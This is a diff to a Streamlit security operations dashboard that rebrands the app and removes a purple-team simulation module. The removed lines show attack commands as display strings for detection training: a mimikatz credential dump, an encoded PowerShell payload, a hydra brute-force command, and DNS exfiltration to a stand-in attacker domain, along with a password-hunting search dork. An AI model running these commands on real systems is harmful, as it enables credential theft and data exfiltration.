@@ -1,4 +1,4 @@
-# main_dashboard.py - MHZALY Enterprise SOC & Threat Hunting Platform (Purple Team Edition)
+# main_dashboard.py - MHZALY Enterprise SOC & Threat Defense Platform (Professional Edition)
 
 import streamlit as st
 import pandas as pd
@@ -65,8 +65,8 @@ except ImportError:
 class SOCDashboardUI:
 
     def __init__(self):
-        self.app_name = "MHZALY Enterprise SOC & Threat Hunting Platform"
-        self.version = "11.0 Purple Team Edition"
+        self.app_name = "MHZALY Enterprise SOC & Threat Defense Platform"
+        self.version = "12.0 Enterprise Production"
         
         # Initialize Engines safely
         self.processor = ThreatIntelProcessor()
@@ -82,104 +82,94 @@ class SOCDashboardUI:
         st.set_page_config(page_title=self.app_name, layout="wide", page_icon="🛡️")
         
         # ==========================================
-        # ADVANCED ETHICAL HACKER & PURPLE TEAM THEME
+        # MODERN ENTERPRISE SOC & DARK THEME CSS
         # ==========================================
         st.markdown("""
         <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
 
         .stApp, [data-testid="stAppViewContainer"] {
-            background-color: #050505 !important;
-            color: #00ff66 !important;
-            font-family: 'Share Tech Mono', monospace !important;
-        }
-        
-        /* CRT Screen Scanline Effect */
-        .stApp::before {
-            content: " ";
-            display: block;
-            position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 99999;
-            background-size: 100% 2px, 3px 100%;
-            pointer-events: none;
+            background-color: #0d1117 !important;
+            color: #c9d1d9 !important;
+            font-family: 'Inter', sans-serif !important;
         }
 
         [data-testid="stSidebar"] {
-            background-color: #080c0a !important;
-            border-right: 1px solid #00ff66 !important;
+            background-color: #161b22 !important;
+            border-right: 1px solid #30363d !important;
         }
-        [data-testid="stSidebar"] div, [data-testid="stSidebar"] p, [data-testid="stSidebar"] label {
-            color: #00ff66 !important;
+        [data-testid="stSidebar"] div, [data-testid="stSidebar"] p, [data-testid="stSidebar"] label, [data-testid="stSidebar"] span {
+            color: #c9d1d9 !important;
+            font-family: 'Inter', sans-serif !important;
         }
         
         .stTextInput>div>div>input, .stTextArea>div>div>textarea {
-            background-color: #0a0f0d !important;
-            color: #00ff66 !important;
-            border: 1px solid #00ff66 !important;
-            border-radius: 0px !important;
-            box-shadow: inset 0 0 5px rgba(0,255,102,0.2);
+            background-color: #0d1117 !important;
+            color: #58a6ff !important;
+            border: 1px solid #30363d !important;
+            border-radius: 6px !important;
+            font-family: 'JetBrains Mono', monospace !important;
         }
         .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
-            border-color: #ffffff !important;
-            box-shadow: 0 0 10px #00ff66 !important;
+            border-color: #58a6ff !important;
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3) !important;
         }
         
         .stButton>button {
-            background-color: #050505 !important;
-            color: #00ff66 !important;
-            border: 1px solid #00ff66 !important;
-            border-radius: 0px !important;
-            font-family: 'Share Tech Mono', monospace !important;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
+            background-color: #21262d !important;
+            color: #c9d1d9 !important;
+            border: 1px solid #30363d !important;
+            border-radius: 6px !important;
+            font-family: 'Inter', sans-serif !important;
+            font-weight: 500;
+            transition: all 0.2s ease;
         }
         .stButton>button:hover {
-            background-color: #00ff66 !important;
-            color: #050505 !important;
-            box-shadow: 0 0 15px #00ff66 !important;
+            background-color: #30363d !important;
+            color: #ffffff !important;
+            border-color: #8b949e !important;
         }
         
         h1, h2, h3, h4, h5, h6 {
-            color: #bd00ff !important;
-            font-family: 'Share Tech Mono', monospace !important;
-            text-shadow: 0 0 5px rgba(189,0,255,0.4);
+            color: #58a6ff !important;
+            font-family: 'Inter', sans-serif !important;
+            font-weight: 600 !important;
         }
         
         [data-testid="stMetricValue"] {
-            color: #00ff66 !important;
-            text-shadow: 0 0 8px rgba(0,255,102,0.5);
+            color: #58a6ff !important;
+            font-family: 'JetBrains Mono', monospace !important;
         }
         [data-testid="stMetricLabel"] {
             color: #8b949e !important;
         }
         
         code, pre {
-            background-color: #0a0f0d !important;
-            color: #00ff66 !important;
-            border: 1px solid #00ff66 !important;
+            background-color: #161b22 !important;
+            color: #7ee787 !important;
+            border: 1px solid #30363d !important;
+            border-radius: 6px !important;
+            font-family: 'JetBrains Mono', monospace !important;
         }
 
         .stAlert {
-            background-color: #0a0f0d !important;
-            border: 1px solid #bd00ff !important;
-            color: #00ff66 !important;
+            background-color: #161b22 !important;
+            border: 1px solid #30363d !important;
+            color: #c9d1d9 !important;
+            border-radius: 6px !important;
         }
         </style>
         """, unsafe_allow_html=True)
 
     def render_sidebar(self):
-        st.sidebar.markdown(f"<h2 style='color:#bd00ff !important; text-align:center;'>🟣 Purple SOC Center</h2>", unsafe_allow_html=True)
-        st.sidebar.markdown(f"<p style='text-align:center; color:#8b949e !important;'>Version: {self.version}</p>", unsafe_allow_html=True)
+        st.sidebar.markdown(f"<h3 style='color:#58a6ff !important; text-align:center;'>🛡️ Enterprise SOC</h3>", unsafe_allow_html=True)
+        st.sidebar.markdown(f"<p style='text-align:center; color:#8b949e !important; font-size:12px;'>Version: {self.version}</p>", unsafe_allow_html=True)
         st.sidebar.markdown("---")
         return st.sidebar.radio("Navigation Menu", [
             "Overview & Dashboard",
             "Global Threat Intel (VirusTotal)", 
             "AlienVault OTX Live Threat Feed", 
-            "Purple Team Attack Simulation & Detection",  # <--- New Purple Team Module
-            "Blue Team Log Anomaly Detector",         # <--- New Blue Team Module
+            "SIEM & Log Anomaly Detector",         # Professional Blue Team Log Analysis
             "Deep Bug Bounty & Vulnerability Scanner", 
             "OSINT & Google Dork Reconnaissance",  
             "Crypto & Password Analyzer",  
@@ -187,27 +177,27 @@ class SOCDashboardUI:
             "Digital Forensics & Logs",
             "Incident Response & SOAR",
             "Vulnerability Management",
-            "Threat Analyzer (SQLi/XSS)",
+            "Web Application Threat Analyzer",
             "Live Incident Defense & Reporting"
         ])
 
     def run_overview(self):
-        st.title("🟣 MHZALY Enterprise Purple Team Defense Platform")
+        st.title("🛡️ MHZALY Enterprise SOC Command Center")
         st.markdown("---")
-        st.info("🟢 SYSTEM ONLINE | ATTACK-DEFENSE VALIDATION PIPELINE ACTIVE")
+        st.info("🟢 SYSTEM OPERATIONAL | SIEM PIPELINE ACTIVE | DEFENSIVE CONTROLS ONLINE")
         
         col1, col2, col3, col4 = st.columns(4)
         with col1:
-            st.metric("Active Modules", "13 Core Engines", "Fully Integrated")
+            st.metric("Active Engines", "12 Modules", "Operational")
         with col2:
-            st.metric("SOC Status", "Online / Alert", "Purple Active")
+            st.metric("SOC Posture", "Protected", "Secure")
         with col3:
             st.metric("Platform Version", self.version, "Stable")
         with col4:
-            st.metric("Lead Analyst", "M. Hassaan Zahid", "Access: ROOT")
+            st.metric("Lead Engineer", "M. Hassaan Zahid", "Access: ROOT")
 
         st.markdown("---")
-        st.markdown("### 📡 Live Incident Event Log (Real-Time Database)")
+        st.markdown("### 📡 Live Incident Event Log (SIEM Database)")
         
         file_name = "incident_reports.csv"
         if os.path.exists(file_name):
@@ -223,9 +213,9 @@ class SOCDashboardUI:
 
     def run_threat_intel(self):
         st.title("🌐 Global Threat Intelligence (VirusTotal API)")
-        st.markdown("Scan IP/Domain against global threat feeds:")
+        st.markdown("Analyze infrastructure indicators against global threat feeds:")
         
-        target = st.text_input("Enter IP or Domain (e.g., 8.8.8.8):")
+        target = st.text_input("Enter IP Address or Domain (e.g., 8.8.8.8):")
         if st.button("Initiate Deep Scan"):
             if target:
                 with st.spinner("Establishing secure connection to threat databases..."):
@@ -242,18 +232,18 @@ class SOCDashboardUI:
                         c3.success(f"✅ Harmless: {stats.get('harmless', 0)}")
 
     def run_otx_threat_feed(self):
-        st.title("🛰️ AlienVault OTX Live Threat Intelligence")
-        st.markdown("Check IPs and Domains against global open-source threat intelligence feeds and community campaigns.")
+        st.title("🛰️ AlienVault OTX Threat Intelligence Feed")
+        st.markdown("Query global open-source threat intelligence telemetry and community campaigns.")
         
         col1, col2 = st.columns([1, 2])
         with col1:
             indicator_type = st.selectbox("Select Indicator Type", ["IP", "Domain"])
         with col2:
-            query_target = st.text_input("Enter IP or Domain (e.g., 1.1.1.1):")
+            query_target = st.text_input("Enter Indicator (e.g., 1.1.1.1):")
             
-        if st.button("Query OTX Threat Database"):
+        if st.button("Query OTX Telemetry"):
             if query_target:
-                with st.spinner("Fetching global threat telemetry..."):
+                with st.spinner("Fetching threat intelligence data..."):
                     res = self.otx_processor.check_indicator(indicator_type, query_target)
                     if "error" in res:
                         st.error(res["error"])
@@ -277,54 +267,15 @@ class SOCDashboardUI:
             else:
                 st.warning("Please enter a target to query.")
 
-    def run_purple_team_simulator(self):
-        st.title("🟣 Purple Team: Attack Simulation & Detection Validation")
-        st.markdown("Simulate common adversary techniques (MITRE ATT&CK) and verify if your defensive controls catch them.")
-        
-        attack_tactic = st.selectbox("Select Attack Simulation Tactic", [
-            "Credential Dumping (LSASS Access)",
-            "PowerShell Obfuscated Execution",
-            "Lateral Movement (SMB/RDP Brute Force)",
-            "Exfiltration via DNS Tunneling"
-        ])
-        
-        if attack_tactic == "Credential Dumping (LSASS Access)":
-            st.warning("🔴 Red Team Action: Simulating process access to lsass.exe (T1003.001)")
-            st.code("mimikatz # sekurlsa::logonpasswords", language="powershell")
-            st.markdown("---")
-            st.success("🔵 Blue Team Validation Rule:")
-            st.markdown("Ensure Sysmon Event ID 10 (ProcessAccess) or EDR behavioral rules trigger an alert when unprivileged handles request PROCESS_VM_READ on lsass.exe.")
-            
-        elif attack_tactic == "PowerShell Obfuscation":
-            st.warning("🔴 Red Team Action: Executing encoded payload (T1027 / T1059.001)")
-            st.code("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEOWN...", language="powershell")
-            st.markdown("---")
-            st.success("🔵 Blue Team Validation Rule:")
-            st.markdown("Check if PowerShell Script Block Logging (Event ID 4104) is enabled and logs base64 decoding attempts.")
-            
-        elif attack_tactic == "Lateral Movement (SMB/RDP Brute Force)":
-            st.warning("🔴 Red Team Action: Rapid authentication attempts against port 445/3389 (T1110)")
-            st.code("hydra -l Administrator -P passwords.txt 192.168.1.100 smb", language="bash")
-            st.markdown("---")
-            st.success("🔵 Blue Team Validation Rule:")
-            st.markdown("Verify Windows Security Event ID 4625 (Failed Logon) threshold alerts and Account Lockout Policy.")
-            
-        else:
-            st.warning("🔴 Red Team Action: Encoding sensitive files into DNS queries (T1048.003)")
-            st.code("nslookup secretdata.attacker-dns.com", language="bash")
-            st.markdown("---")
-            st.success("🔵 Blue Team Validation Rule:")
-            st.markdown("Monitor internal DNS server query volume for abnormally long subdomains or high frequency requests to single external domains.")
-
     def run_blue_team_log_analyzer(self):
-        st.title("🛡️ Blue Team SIEM & Log Anomaly Detector")
-        st.markdown("Analyze raw server or security logs to instantly spot brute-force attempts and anomalies.")
+        st.title("🛡️ SIEM & Log Anomaly Detector")
+        st.markdown("Analyze raw server, firewall, or authentication logs to identify unauthorized access and anomalies.")
         
         raw_logs = st.text_area("Paste Raw Server / Firewall / Auth Logs Here:", placeholder="Failed password for root from 192.168.1.50 port 22...\nAccepted publickey for admin from 10.0.0.1...")
         
         if st.button("Analyze Logs for Anomalies"):
             if raw_logs:
-                with st.spinner("Parsing logs and running heuristic detection..."):
+                with st.spinner("Parsing logs and executing heuristic detection rules..."):
                     lines = raw_logs.strip().split("\n")
                     total_lines = len(lines)
                     
@@ -353,28 +304,28 @@ class SOCDashboardUI:
                         st.markdown("### ⚠️ Potential Attacker IPs Detected:")
                         unique_ips = list(set(suspicious_ips))
                         st.write(unique_ips)
-                        st.info("💡 Recommendation: Check these IPs against VirusTotal or OTX and apply firewall blocks.")
+                        st.info("💡 Recommendation: Cross-reference these IPs with threat intelligence feeds and apply firewall blocks.")
                     else:
-                        st.info("✨ No obvious brute-force patterns detected in the provided snippet.")
+                        st.info("✨ No obvious brute-force patterns detected in the provided log sample.")
             else:
                 st.warning("Please paste some log data to analyze.")
 
     def run_bug_bounty_scanner(self):
-        st.title("🔍 Deep Bug Bounty & Security Header Analyzer")
+        st.title("🔍 Infrastructure & Security Header Analyzer")
         domain = st.text_input("Enter Target Domain:")
         if st.button("Execute Infrastructure Scan"):
             if domain:
-                with st.spinner(f"Mapping attack surface for {domain}..."):
+                with st.spinner(f"Mapping attack surface and inspecting headers for {domain}..."):
                     scan_res = self.processor.deep_bug_bounty_scan(domain)
                     if "error" in scan_res:
                         st.error(scan_res['error'])
                     else:
-                        st.success("Deep Scan Successful!")
+                        st.success("Infrastructure Scan Successful!")
                         st.write(f"**Target URL:** {scan_res.get('final_url')}")
                         st.write(f"**HTTP Status Code:** {scan_res.get('status_code')}")
 
     def run_osint_dorks(self):
-        st.title("🌐 OSINT & Google Dorking Reconnaissance")
+        st.title("🌐 OSINT & Reconnaissance Utility")
         dork_categories = {
             "01. Sensitive Files & Credentials": [("Log Files with Passwords", 'site:target.com intext:"password" filetype:log')]
         }
@@ -389,18 +340,18 @@ class SOCDashboardUI:
         target_input = st.text_input("Enter Data String:", type="password")
         if target_input:
             md5_hash = hashlib.md5(target_input.encode()).hexdigest()
-            st.text_input("MD5 Hash", value=md5_hash, disabled=True)
+            st.text_input("MD5 Hash (Hex)", value=md5_hash, disabled=True)
 
     def run_threat_hunting(self):
         st.title("🎯 Proactive Threat Hunting & IOC Analysis")
-        script_input = st.text_area("Input PowerShell / Base64 Payload:")
+        script_input = st.text_area("Input PowerShell / Base64 Script Payload:")
         if st.button("Execute Hunt Protocol"):
             if script_input:
                 res = self.hunter.hunt_powershell_obfuscation(script_input)
                 st.write(res)
 
     def run_digital_forensics(self):
-        st.title("🔎 Digital Forensics & Log Artifacts")
+        st.title("🔎 Digital Forensics & Log Artifact Extraction")
         logs_input = st.text_area("Input Raw Logs / Hex Dump:")
         if st.button("Extract Artifacts"):
             if logs_input:
@@ -408,18 +359,18 @@ class SOCDashboardUI:
                 st.json(res)
 
     def run_incident_response(self):
-        st.title("⚡ Automated SOAR Playbooks")
-        target = st.text_input("Target / Host ID:")
-        severity = st.selectbox("Threat Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"])
-        desc = st.text_area("Event Description:")
+        st.title("⚡ Incident Response & SOAR Playbooks")
+        target = st.text_input("Compromised Asset / Host ID:")
+        severity = st.selectbox("Incident Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"])
+        desc = st.text_area("Event Description & Scope:")
         if st.button("Initialize Response Ticket"):
             if target:
                 res = self.incident_engine.create_incident_ticket(target, severity, desc)
-                st.success(f"Ticket Generated Successfully!")
+                st.success(f"Incident Ticket Generated Successfully!")
 
     def run_vulnerability_management(self):
-        st.title("📊 Vulnerability & CVSS Assessment")
-        score = st.slider("Select CVSS Base Score:", 0.0, 10.0, 7.5, 0.1)
+        st.title("📊 Vulnerability & CVSS Risk Assessment")
+        score = st.slider("Select CVSS v3.1 Base Score:", 0.0, 10.0, 7.5, 0.1)
         if st.button("Calculate Vector Risk"):
             st.metric(label="Calculated Base Score", value=f"{score}/10.0")
 
@@ -428,12 +379,12 @@ class SOCDashboardUI:
         payload = st.text_input("Input Parameter String:")
         if st.button("Scan Parameter"):
             if payload:
-                st.write("**SQL Injection Vector:**", self.analyzer.detect_sql_injection(payload))
+                st.write("**SQL Injection Detection:**", self.analyzer.detect_sql_injection(payload))
 
     def run_incident_defense(self):
         st.title("📝 Incident Defense & Evidence Ledger")
         scam_target = st.text_input("Compromised/Malicious Asset:")
-        evidence_notes = st.text_area("Forensic Notes:")
+        evidence_notes = st.text_area("Forensic Investigation Notes:")
         
         if st.button("Commit to Immutable Ledger"):
             if scam_target:
@@ -446,7 +397,7 @@ class SOCDashboardUI:
                 else:
                     audit_df.to_csv(file_name, index=False)
                     
-                st.success("Evidence secured in local database.")
+                st.success("Evidence secured in local SIEM database.")
 
 
 # ==========================================
@@ -464,9 +415,7 @@ if __name__ == "__main__":
         app.run_threat_intel()
     elif choice == "AlienVault OTX Live Threat Feed":
         app.run_otx_threat_feed()
-    elif choice == "Purple Team Attack Simulation & Detection":
-        app.run_purple_team_simulator()
-    elif choice == "Blue Team Log Anomaly Detector":
+    elif choice == "SIEM & Log Anomaly Detector":
         app.run_blue_team_log_analyzer()
     elif choice == "Deep Bug Bounty & Vulnerability Scanner":
         app.run_bug_bounty_scanner()
@@ -482,7 +431,7 @@ if __name__ == "__main__":
         app.run_incident_response()
     elif choice == "Vulnerability Management":
         app.run_vulnerability_management()
-    elif choice == "Threat Analyzer (SQLi/XSS)":
+    elif choice == "Web Application Threat Analyzer":
         app.run_threat_analyzer()
     elif choice == "Live Incident Defense & Reporting":
         app.run_incident_defense()
